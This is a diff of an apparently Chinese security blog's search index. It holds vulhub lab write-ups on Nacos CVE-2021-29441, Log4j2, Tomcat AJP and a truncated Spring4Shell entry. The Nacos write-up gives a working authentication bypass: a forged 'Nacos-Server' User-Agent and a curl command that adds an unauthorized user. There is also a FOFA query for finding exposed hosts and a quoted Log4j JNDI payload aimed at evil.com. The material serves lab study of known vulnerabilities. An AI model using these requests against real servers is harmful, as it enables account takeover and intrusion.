@@ -36,6 +36,46 @@
       </tags>
   </entry>
   <entry>
+    <title>CVE-2021-29441(Nacos 身份验证绕过)</title>
+    <url>/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/</url>
+    <content><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。<br>该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.Nacos &lt;&#x3D; 2.0.0-ALPHA.1</p>
+<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10、192.168.129.130_kali</p>
+<p>靶机 ：192.168.129.131_centos</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose build #进行编译<br><br>docker-compose up -d #运行靶场<br><br>docker ps  #查看容器<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815211759633.png" alt="image-20220815211759633"></p>
+<p>发现开放了8848、9555、3306、33060端口</p>
+<h5 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h5><p>访问<a href="http://192.168.129.131:8848/nacos/#/login">http://192.168.129.131:8848/nacos/#/login</a></p>
+<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815212559303.png" alt="image-20220815212559303"></p>
+<p>执行一个只能登录后才能实现的操作（查看已有的用户）</p>
+<p><a href="http://192.168.129.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=2">http://192.168.129.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=2</a></p>
+<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815221511755.png" alt="image-20220815221511755"></p>
+<p>被禁止访问</p>
+<p>再次访问以上操作，用bp抓包，发送到repeater模块，并将<code>User-Agent</code>的值修改为<code>Nacos-Server</code>，看下200返回包</p>
+<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815223545251.png" alt="image-20220815223545251"></p>
+<p>从反应包中可以看到，用户名和加密过后的密码</p>
+<h5 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h5><p>使用kalii执行以下命令，添加一个名为sun的新用户</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">curl -XPOST &#x27;http://192.168.129.131:8848/nacos/v1/auth/users?username=sun&amp;password=sun&#x27; -H &#x27;User-Agent: Nacos-Server&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815230803011.png" alt="image-20220815230803011"></p>
+<p>再次执行查看用户列表的操作，可以看到sun用户</p>
+<p><a href="http://192.168.129.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=2">http://192.168.129.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=2</a></p>
+<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815231136551.png" alt="image-20220815231136551"></p>
+<p>使用sun用户进行登录，成功进入</p>
+<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815231718604.png" alt="image-20220815231718604"></p>
+<h5 id="4-关闭环境"><a href="#4-关闭环境" class="headerlink" title="4.关闭环境"></a>4.关闭环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose down --rmi all -v #关闭并删除环境<br></code></pre></td></tr></table></figure>
+
+<p>(fofa关键字：<code>title=&quot;nacos&quot;</code>)</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2020-1938（Aapache Tomcat AJP 任意文件读取包含漏洞）</title>
     <url>/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/</url>
     <content><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Tomcat在默认的conf&#x2F;server.xml中配置了2个Connector，一个默认监听8080端口处理HTTP请求，另外一个默认监听8009端口处理AJP请求，方便与其他Web服务器通过AJP协议进行交互。由于Tomcat AJP协议存在缺陷，致使攻击者可以控制三个参数javax.servlet.include.request_uri、javax.servlet.include.path_info、javax.servlet.include.servlet_path，通过构造特定参数读取webapp目录下的任意文件或包含文件，如：webapp 配置文件或源代码等。</p>
@@ -89,46 +129,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2021-29441(Nacos 身份验证绕过)</title>
-    <url>/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/</url>
-    <content><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。<br>该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息。</p>
-<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.Nacos &lt;&#x3D; 2.0.0-ALPHA.1</p>
-<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10、192.168.129.130_kali</p>
-<p>靶机 ：192.168.129.131_centos</p>
-<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose build #进行编译<br><br>docker-compose up -d #运行靶场<br><br>docker ps  #查看容器<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815211759633.png" alt="image-20220815211759633"></p>
-<p>发现开放了8848、9555、3306、33060端口</p>
-<h5 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h5><p>访问<a href="http://192.168.129.131:8848/nacos/#/login">http://192.168.129.131:8848/nacos/#/login</a></p>
-<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815212559303.png" alt="image-20220815212559303"></p>
-<p>执行一个只能登录后才能实现的操作（查看已有的用户）</p>
-<p><a href="http://192.168.129.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=2">http://192.168.129.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=2</a></p>
-<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815221511755.png" alt="image-20220815221511755"></p>
-<p>被禁止访问</p>
-<p>再次访问以上操作，用bp抓包，发送到repeater模块，并将<code>User-Agent</code>的值修改为<code>Nacos-Server</code>，看下200返回包</p>
-<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815223545251.png" alt="image-20220815223545251"></p>
-<p>从反应包中可以看到，用户名和加密过后的密码</p>
-<h5 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h5><p>使用kalii执行以下命令，添加一个名为sun的新用户</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">curl -XPOST &#x27;http://192.168.129.131:8848/nacos/v1/auth/users?username=sun&amp;password=sun&#x27; -H &#x27;User-Agent: Nacos-Server&#x27;<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815230803011.png" alt="image-20220815230803011"></p>
-<p>再次执行查看用户列表的操作，可以看到sun用户</p>
-<p><a href="http://192.168.129.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=2">http://192.168.129.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=2</a></p>
-<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815231136551.png" alt="image-20220815231136551"></p>
-<p>使用sun用户进行登录，成功进入</p>
-<p><img src="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/image-20220815231718604.png" alt="image-20220815231718604"></p>
-<h5 id="4-关闭环境"><a href="#4-关闭环境" class="headerlink" title="4.关闭环境"></a>4.关闭环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose down --rmi all -v #关闭并删除环境<br></code></pre></td></tr></table></figure>
-
-<p>(fofa关键字：<code>title=&quot;nacos&quot;</code>)</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2021-44228（Apache Log4j2 查找功能 JNDI 注入）</title>
     <url>/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/</url>
     <content><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p>
@@ -160,6 +160,26 @@
 <p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810112302254-1660183567356.png" alt="image-20220810112302254-1660183567356"></p>
 <h5 id="4-关闭环境"><a href="#4-关闭环境" class="headerlink" title="4.关闭环境"></a>4.关闭环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose down --rmi all -v #关闭并删除环境<br></code></pre></td></tr></table></figure>
 ]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2022-22965(Spring Framework RCE via Data Binding on JDK 9+)</title>
+    <url>/2022/08/16/CVE-2022-22965(Spring%20Framework%20RCE%20via%20Data%20Binding%20on%20JDK%209+)/</url>
+    <content><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Spring framework 是Spring 里面的一个基础开源框架，其目的是用于简化 Java 企业级应用的开发难度和开发周期，在Spring框架的JDK9版本(及以上版本)中，远程攻击者可在满足特定条件的基础上，通过框架的参数绑定功能获取AccessLogValve对象并诸如恶意字段值，从而触发pipeline机制并写入任意路径下的文件。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、JDK9+<br>2、Spring Framework &lt; 5.3.18或Spring Framework &lt; 5.2.20</p>
+<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.130_window10、192.168.129.128_kali</p>
+<p>靶机 ：192.168.129.131_centos</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose build #进行编译<br><br>docker-compose up -d #运行靶场<br><br>docker ps  #查看容器<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h5>]]></content>
       <categories>
         <category>漏洞复现</category>
       </categories>
